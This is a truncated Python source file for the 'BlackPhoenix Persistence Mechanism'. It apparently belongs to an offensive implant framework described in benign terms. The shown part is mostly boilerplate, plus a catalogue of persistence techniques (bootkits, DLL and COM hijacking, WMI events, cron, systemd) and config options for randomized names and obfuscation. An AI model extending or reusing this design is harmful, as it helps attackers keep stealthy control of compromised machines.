"""
BlackPhoenix Persistence Mechanism
Ensures persistence of critical systems and services
"""
import logging
import threading
import time
import queue
import json
import os
import yaml
import uuid
import platform
import subprocess
import shutil
import base64
import hashlib
from typing import Dict, List, Any, Optional, Union, Tuple, Callable
from datetime import datetime


class PersistenceType:
    """Enum-like class for persistence types"""
    REGISTRY = "registry"
    SERVICE = "service"
    SCHEDULED_TASK = "scheduled_task"
    STARTUP_FOLDER = "startup_folder"
    WMI_EVENT = "wmi_event"
    DLL_HIJACKING = "dll_hijacking"
    BOOTKIT = "bootkit"
    COM_HIJACKING = "com_hijacking"
    DRIVER = "driver"
    LOGIN_ITEM = "login_item"  # macOS
    LAUNCH_DAEMON = "launch_daemon"  # macOS/Linux
    CRON_JOB = "cron_job"  # Linux
    SYSTEMD_UNIT = "systemd_unit"  # Linux


class OperatingSystem:
    """Enum-like class for operating systems"""
    WINDOWS = "windows"
    LINUX = "linux"
    MACOS = "macos"
    UNKNOWN = "unknown"


class PersistenceMechanism:
    """Ensures persistence of critical systems and services"""
    
    def __init__(self, config_path: str = "blackphoenix/config.yaml"):
        """Initialize the persistence mechanism
        
        Args:
            config_path: Path to configuration file
        """
        self.logger = self._setup_logging()
        self.config = self._load_config(config_path)
        self.running = False
        
        # Persistence registry
        self.persistence_entries = {}
        
        # Target system information
        self.system_profiles = {}
        
        # Thread synchronization
        self.data_lock = threading.RLock()
        self.check_queue = queue.Queue()
        self.verification_queue = queue.Queue()
        self.event_queue = queue.Queue()
        
        # Event callbacks
        self.event_callbacks = []
        
        # Match OS to techniques
        self.os_technique_map = {
            OperatingSystem.WINDOWS: [
                PersistenceType.REGISTRY,
                PersistenceType.SERVICE,
                PersistenceType.SCHEDULED_TASK,
                PersistenceType.STARTUP_FOLDER,
                PersistenceType.WMI_EVENT,
                PersistenceType.DLL_HIJACKING,
                PersistenceType.COM_HIJACKING,
                PersistenceType.DRIVER,
                PersistenceType.BOOTKIT
            ],
            OperatingSystem.LINUX: [
                PersistenceType.CRON_JOB,
                PersistenceType.SYSTEMD_UNIT,
                PersistenceType.LAUNCH_DAEMON
            ],
            OperatingSystem.MACOS: [
                PersistenceType.LOGIN_ITEM,
                PersistenceType.LAUNCH_DAEMON
            ]
        }
        
        self.logger.info("BlackPhoenix Persistence Mechanism initialized")
    
    def _setup_logging(self) -> logging.Logger:
        """Set up logging for the module
        
        Returns:
            Configured logger
        """
        logger = logging.getLogger("BlackPhoenix.PersistenceMechanism")
        logger.setLevel(logging.INFO)
        
        # Create handlers
        c_handler = logging.StreamHandler()
        f_handler = logging.FileHandler("blackphoenix_persistence.log")
        c_handler.setLevel(logging.INFO)
        f_handler.setLevel(logging.DEBUG)
        
        # Create formatters
        formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
        c_handler.setFormatter(formatter)
        f_handler.setFormatter(formatter)
        
        # Add handlers to logger
        logger.addHandler(c_handler)
        logger.addHandler(f_handler)
        
        return logger
    
    def _load_config(self, config_path: str) -> Dict[str, Any]:
        """Load configuration from YAML file
        
        Args:
            config_path: Path to configuration file
            
        Returns:
            Dictionary with configuration settings
        """
        try:
            with open(config_path, 'r') as f:
                config = yaml.safe_load(f)
            
            # Extract persistence-specific config
            persistence_config = config.get("persistence", {})
            
            self.logger.debug(f"Configuration loaded from {config_path}")
            return persistence_config
        except Exception as e:
            self.logger.warning(f"Failed to load configuration from {config_path}: {e}")
            
            # Return default configuration
            return {
                "check_interval": 300,  # seconds (5 minutes)
                "max_retries": 3,
                "retry_delay": 60,  # seconds (1 minute)
                "techniques": {
                    "windows": [
                        "registry",
                        "service",
                        "scheduled_task",
                        "startup_folder",
                        "wmi_event"
                    ],
                    "linux": [
                        "cron_job",
                        "systemd_unit"
                    ],
                    "macos": [
                        "launch_daemon",
                        "login_item"
                    ]
                },
                "redundancy_factor": 2,
                "staggering": True,
                "stagger_interval": 60,  # seconds
                "randomize_names": True,
                "obfuscation_level": "medium"
            }
    
    def start(self):
        """Start the persistence mechanism"""
        if self.running:
            return
            
        self.running = True
        
        # Start